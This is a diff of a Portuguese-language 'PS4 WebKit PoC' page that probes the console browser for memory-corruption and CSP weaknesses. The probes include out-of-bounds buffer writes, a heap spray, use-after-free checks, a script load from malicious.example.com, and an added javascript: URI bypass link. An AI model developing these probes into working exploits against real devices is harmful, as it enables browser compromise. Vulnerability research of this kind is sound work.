@@ -2,8 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit PoC - Testes Máximos</title>
-    <style>
+    <title>PS4 WebKit PoC - Testes Máximos v2</title> <style>
         /* Estilos CSS */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; /* Reduzido para caber mais log */}
         #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; /* Aumentado */ overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
@@ -17,14 +16,13 @@
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit PoC - Demonstração Máxima</h1>
-    <p>AVISO: Script extenso e agressivo. Pode ser lento e/ou travar o navegador. Observe o log.</p>
+    <h1>PS4 WebKit PoC - Demonstração Máxima v2</h1> <p>AVISO: Script extenso e agressivo. Pode ser lento e/ou travar o navegador. Observe o log. Teste CSP inclui link que requer clique manual.</p>
     <div id="poc-output"></div>
 
     <script>
         const outputDiv = document.getElementById('poc-output');
         const log = (message, type = 'info') => {
-            // Função log
+            // Função log (igual aos scripts anteriores)
             if (outputDiv) {
                 const timestamp = `[${new Date().toLocaleTimeString()}] `;
                 const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
@@ -46,7 +44,7 @@
             try {
                 const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
                 const initialByteLength = buffer.byteLength; const writeValue = 0xEE;
-                const writeOffsets = [-1, bufferSize, bufferSize + 10]; // Ajustado para +10 consistentemente
+                const writeOffsets = [-1, bufferSize, bufferSize + 10];
                 const readOffsets = [0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 4, bufferSize + 8];
                 for (const writeOffset of writeOffsets) {
                     log(`Tentando escrita OOB U8 no offset ${writeOffset}...`, 'subtest');
@@ -121,7 +119,7 @@
             try {
                 const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
                 const writeOffset = bufferSize; // Offset OOB
-                const valuesToWrite = [0, 0xFF, 0x80, 0x7F, -1, 128]; // Testar 0, max byte, limites int8, negativo, etc.
+                const valuesToWrite = [0, 0xFF, 0x80, 0x7F, -1, 128];
 
                 for(const value of valuesToWrite) {
                      log(`Tentando escrita OOB U8 no offset ${writeOffset} com valor ${value}...`, 'subtest');
@@ -158,15 +156,13 @@
 
                 const attackView = new Uint8Array(buffers[attackIndex]);
                 const victimView = new Uint8Array(buffers[victimIndex]);
-                // Escrever OOB além do buffer atacante, tentando acertar a vítima
-                // A distância exata depende da alocação, tentar alguns offsets
                 const oobOffsets = [bufferSize, bufferSize + 16, bufferSize * 2];
                 const writeValue = 0xAB;
                 let spraySuccess = false;
 
                 for (const writeOffset of oobOffsets) {
                     if(spraySuccess) break;
-                    const checkOffsetInVictim = writeOffset - bufferSize; // Offset relativo na vítima (simplificação!)
+                    const checkOffsetInVictim = writeOffset - bufferSize;
 
                     if(checkOffsetInVictim >= 0 && checkOffsetInVictim < bufferSize) {
                         log(`Buffer Atacante [${attackIndex}], Buffer Vítima [${victimIndex}]. Offset OOB: ${writeOffset}`, 'info');
@@ -177,9 +173,9 @@
                         log(`Tentando escrita OOB no offset ${writeOffset} do buffer atacante...`, 'subtest');
                         try {
                             attackView[writeOffset] = writeValue;
-                            log(`VULNERÁVEL? Escrita OOB no spray bem-sucedida (sem erro)!`, 'vuln'); // OOB write funciona
+                            log(`VULNERÁVEL? Escrita OOB no spray bem-sucedida (sem erro)!`, 'vuln');
 
-                            await new Promise(resolve => setTimeout(resolve, 20)); // Pequena pausa
+                            await new Promise(resolve => setTimeout(resolve, 20));
 
                             let valueAfter = 'error';
                             try { valueAfter = victimView[checkOffsetInVictim]; } catch(e){ log(`Erro leitura pós: ${e.message}`, 'warn');}
@@ -187,7 +183,7 @@
 
                             if (valueAfter === writeValue && valueBefore !== writeValue) {
                                 log(`VULNERÁVEL: HEAP SPRAY SIMPLES bem-sucedido! Escrita OOB afetou outro buffer!`, 'vuln');
-                                spraySuccess = true; // Parar após o primeiro sucesso
+                                spraySuccess = true;
                             } else {
                                 log("Tentativa de sobrescrever buffer adjacente falhou ou não detectada para este offset.", 'warn');
                             }
@@ -205,13 +201,35 @@
             log("--- Teste 4 Concluído ---", 'test');
         };
 
-        // Teste 5: CSP Bypass
+        // Teste 5: CSP Bypass (Inclui teste de link javascript:)
         const runCSPTest = () => {
             log("--- Iniciando Teste 5: CSP Bypass ---", 'test');
-            log("Tentando carregar script via data: URI...", 'info'); try { const s=document.createElement('script'); s.src='data:text/javascript;base64,bG9nKCJWVUxORVLCgVZFTDogQnlwYXNzIGRlIENTUCB2aWEgZGF0YTogVVJJIGJlbS1zdWNlZGlkbyEiLCAndnVsbicpOw=='; document.body.appendChild(s); } catch (e) { log(`Erro data:: ${e.message}`, 'warn'); }
-            log("Tentando executar script via inline handler (onerror)...", 'info'); try { const i=document.createElement('img'); i.src='x'; i.onerror=()=>{log("VULNERÁVEL: Bypass de CSP via inline handler 'onerror' bem-sucedido!", 'vuln');}; document.body.appendChild(i); } catch (e) { log(`Erro onerror: ${e.message}`, 'warn'); }
-            log("Tentando carregar script de fonte externa (deve ser bloqueado)...", 'info'); try { const es=document.createElement('script'); es.src='https://malicious.example.com/blocked.js'; es.onload=()=>{log("ERRO CSP: NÃO bloqueou externo!", 'vuln');}; es.onerror=()=>{log("✅ Bloqueio CSP externo funcionou.", 'good');}; document.body.appendChild(es); } catch (e) { log(`Erro script ext: ${e.message}`, 'warn'); }
-            log("--- Teste 5 Concluído ---", 'test');
+            // 5.1: data: URI
+            log("Tentando carregar script via data: URI...", 'info');
+            try { const s=document.createElement('script'); s.src='data:text/javascript;base64,bG9nKCJWVUxORVLCgVZFTDogQnlwYXNzIGRlIENTUCB2aWEgZGF0YTogVVJJIGJlbS1zdWNlZGlkbyEiLCAndnVsbicpOw=='; document.body.appendChild(s); } catch (e) { log(`Erro data:: ${e.message}`, 'warn'); }
+
+            // 5.2: inline handler
+            log("Tentando executar script via inline handler (onerror)...", 'info');
+            try { const i=document.createElement('img'); i.src='x'; i.onerror=()=>{log("VULNERÁVEL: Bypass de CSP via inline handler 'onerror' bem-sucedido!", 'vuln');}; document.body.appendChild(i); } catch (e) { log(`Erro onerror: ${e.message}`, 'warn'); }
+
+            // 5.3: fonte externa (bloqueio esperado)
+            log("Tentando carregar script de fonte externa (deve ser bloqueado)...", 'info');
+            try { const es=document.createElement('script'); es.src='https://malicious.example.com/blocked.js'; es.onload=()=>{log("ERRO CSP: NÃO bloqueou externo!", 'vuln');}; es.onerror=()=>{log("✅ Bloqueio CSP externo funcionou.", 'good');}; document.body.appendChild(es); } catch (e) { log(`Erro script ext: ${e.message}`, 'warn'); }
+
+            // 5.4: javascript: URI em link (NOVO TESTE - requer clique)
+            log("Tentando injetar link com javascript: URI (requer clique)...", 'info');
+             try {
+                const jsLink = document.createElement('a');
+                // Usar log() aqui pode ser mais confiável que alert() dependendo das restrições
+                jsLink.href = "javascript:log('VULNERÁVEL: Bypass de CSP via javascript: URI em link clicado!', 'vuln'); try{alert('Bypass via javascript: URI!');}catch(e){log('Alerta bloqueado no javascript: URI', 'warn');}";
+                jsLink.textContent = "[Clique AQUI para Testar javascript: URI Bypass]";
+                jsLink.style.display = 'block'; jsLink.style.margin = '10px'; jsLink.style.padding = '5px';
+                jsLink.style.border = '1px solid orange'; jsLink.style.color = 'orange';
+                outputDiv.appendChild(jsLink); // Adicionar perto dos logs
+                log("Link com javascript: URI adicionado. Teste requer clique manual.", 'warn');
+            } catch (e) { log(`Erro ao criar link javascript:: ${e.message}`, 'warn'); }
+
+            log("--- Teste 5 Concluído (Verifique logs e clique no link) ---", 'test');
         };
 
         // Teste 6: Prototype Pollution
@@ -237,7 +255,7 @@
                 log("Tentando acessar .tagName da ref...", 'info'); let tn=uaf_cRef.tagName; log(`tagName ok: ${tn}`, 'warn');
                 log("Tentando chamar .getBoundingClientRect()...", 'info'); uaf_cRef.getBoundingClientRect(); log("getBoundingClientRect ok.", 'warn');
             } catch (e) { log(`ERRO (Potencial UAF DOM): ${e.message}`, 'vuln');
-            } finally { uaf_cRef = null; /* Basic cleanup */ }
+            } finally { uaf_cRef = null; }
 
             // Cenário 2: Nó SVG
             log("Cenário 2: Nó SVG.", 'subtest');
@@ -254,7 +272,7 @@
                 log("Tentando acessar .id da ref SVG...", 'info'); let id=svgRef.id; log(`id ok: ${id}`, 'warn');
                 log("Tentando chamar .getBBox()...", 'info'); svgRef.getBBox(); log("getBBox ok.", 'warn');
             } catch (e) { log(`ERRO (Potencial UAF SVG): ${e.message}`, 'vuln');
-            } finally { svgRef = null; /* Basic cleanup */ }
+            } finally { svgRef = null; }
             log("--- Teste 7 Concluído ---", 'test');
         };
 
@@ -264,7 +282,7 @@
             // Cenários 1 & 2
             log("Cenário 1 & 2: DOM APIs e .toFixed()", 'subtest');
              try {window.postMessage(window,"*"); log("postMessage(win) ok.",'good');} catch(e){log(`Erro postMsg: ${e.message}`,'warn');}
-             try {document.dispatchEvent({ target: document.body, type: "click" }); log("dispatchEvent({}) ok.",'good');}catch(e){log(`Erro dispatchEv: ${e.message}`,'warn');} // Ajustado para objeto similar ao original
+             try {document.dispatchEvent({ target: document.body, type: "click" }); log("dispatchEvent({}) ok.",'good');}catch(e){log(`Erro dispatchEv: ${e.message}`,'warn');}
              try {let nP=5,nO=new Number(5);let r=nP.toFixed(nO);log(`.toFixed() ok: ${r}`,'good');} catch(e){log(`ERRO (.toFixed Pot. TC): ${e.message}`,'vuln');}
 
             // Cenário 3: IndexedDB
@@ -288,11 +306,11 @@
             log("--- Iniciando Teste 9: Environment Probing ---", 'test');
             try {
                 log("Propriedades de 'navigator':", 'subtest');
-                for (const key in navigator) { try { log(`  navigator.${key} = ${navigator[key]}`, 'info'); } catch (e) { /* Ignore errors */ } }
+                for (const key in navigator) { try { log(`  navigator.${key} = ${navigator[key]}`, 'info'); } catch (e) { /* Ignore */ } }
             } catch (e) { log("Erro ao ler 'navigator'", 'warn'); }
             try {
                 log("Propriedades de 'screen':", 'subtest');
-                 for (const key in screen) { try { log(`  screen.${key} = ${screen[key]}`, 'info'); } catch (e) { /* Ignore errors */ } }
+                 for (const key in screen) { try { log(`  screen.${key} = ${screen[key]}`, 'info'); } catch (e) { /* Ignore */ } }
             } catch (e) { log("Erro ao ler 'screen'", 'warn'); }
              try { log("Stack Trace de Erro:", 'subtest'); throw new TypeError("Erro de teste"); }
              catch (e) { log(`  error.stack: ${e.stack}`, 'info'); }
@@ -310,13 +328,13 @@
 
         // --- Função Principal de Execução ---
         const runAllTests = async () => {
-            log("Iniciando todos os testes de PoC (VERSÃO MÁXIMA)...");
+            log("Iniciando todos os testes de PoC (VERSÃO MÁXIMA v2)...");
             const tests = [
                 runOOBTestLeakMeta,       // Teste 1
                 runOOBOtherTypes,         // Teste 2
                 runOOBWriteValues,        // Teste 3
                 runOOBHeapSprayAttempt,   // Teste 4
-                runCSPTest,               // Teste 5
+                runCSPTest,               // Teste 5 *Atualizado*
                 runPrototypePollutionTest,// Teste 6
                 runUAFTests,              // Teste 7
                 runTypeConfusionTests,    // Teste 8
@@ -330,7 +348,13 @@
                      console.error("Output div sumiu, provável crash/problema.");
                      break; // Interrompe a sequência
                 }
-                 await tests[i]();
+                 // Adicionar try...catch geral para cada teste principal
+                 try {
+                    await tests[i]();
+                 } catch(testError) {
+                    log(`ERRO INESPERADO DURANTE TESTE ${i+1}: ${testError.message}`, 'error');
+                 }
+
                  if (i < tests.length - 1) { // Não pausar após o último
                     log(`Pausa ${PAUSE_DURATION}ms...`, 'info');
                     await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION));
@@ -338,7 +362,7 @@
             }
 
             // Esta mensagem pode não aparecer se o crash probe funcionar
-            log("\n\nTodos os testes PoC MÁXIMOS foram concluídos (se não travou). Revise o log acima.", 'test');
+            log("\n\nTodos os testes PoC MÁXIMOS v2 foram concluídos (se não travou). Revise o log acima.", 'test');
         };
 
         // Executar ao carregar a página
